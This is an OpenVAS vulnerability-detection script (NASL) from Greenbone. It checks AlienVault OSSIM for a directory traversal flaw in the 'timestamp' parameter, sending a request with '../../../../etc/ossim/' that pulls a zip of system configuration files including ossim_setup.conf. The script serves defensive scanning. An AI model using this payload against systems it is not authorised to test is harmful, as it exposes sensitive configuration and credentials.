###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_ossim_62899.nasl 11867 2018-10-12 10:48:11Z cfischer $
#
# AlienVault Open Source SIEM (OSSIM) 'timestamp' Parameter Directory Traversal Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2014 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:alienvault:open_source_security_information_management";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105047");
  script_bugtraq_id(62899);
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_version("$Revision: 11867 $");

  script_name("AlienVault Open Source SIEM (OSSIM) 'timestamp' Parameter Directory Traversal Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/62899");
  script_xref(name:"URL", value:"http://forums.alienvault.com/discussion/comment/9407");

  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:48:11 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2014-06-19 11:18:42 +0200 (Thu, 19 Jun 2014)");
  script_category(ACT_ATTACK);
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2014 Greenbone Networks GmbH");
  script_dependencies("gb_ossim_web_detect.nasl");
  script_require_ports("Services/www", 443);
  script_mandatory_keys("OSSIM/installed");

  script_tag(name:"impact", value:"Exploiting this issue can allow an attacker to gain access to
arbitrary system files. Information harvested may aid in launching
further attacks.");
  script_tag(name:"vuldetect", value:"Send a special crafted HTTP GET request and check the response.");
  script_tag(name:"insight", value:"Open Source SIEM (OSSIM) is prone to a directory-traversal
vulnerability because it fails to sufficiently sanitize user-supplied input.");
  script_tag(name:"solution", value:"Updates are available.");
  script_tag(name:"summary", value:"AlienVault Open Source SIEM (OSSIM) 'timestamp' Parameter Directory
Traversal Vulnerability");
  script_tag(name:"affected", value:"All AlienVault Versions prior to v4.3.3.1");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");


if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

url = dir + '/ocsreports/tele_compress.php?timestamp=../../../../etc/ossim/';

req = http_get( item:url, port:port );
buf = http_send_recv( port:port, data:req, bodyonly:FALSE );

if( buf =~ "^HTTP/1\.[01] 200" && buf =~ "Content-Disposition: attachment; filename=.*\.zip" )
{
  if( "PK" >< buf && "ossim_setup.conf" >< buf )
  {
    security_message( port:port );
    exit( 0 );
  }
}

exit( 99 );

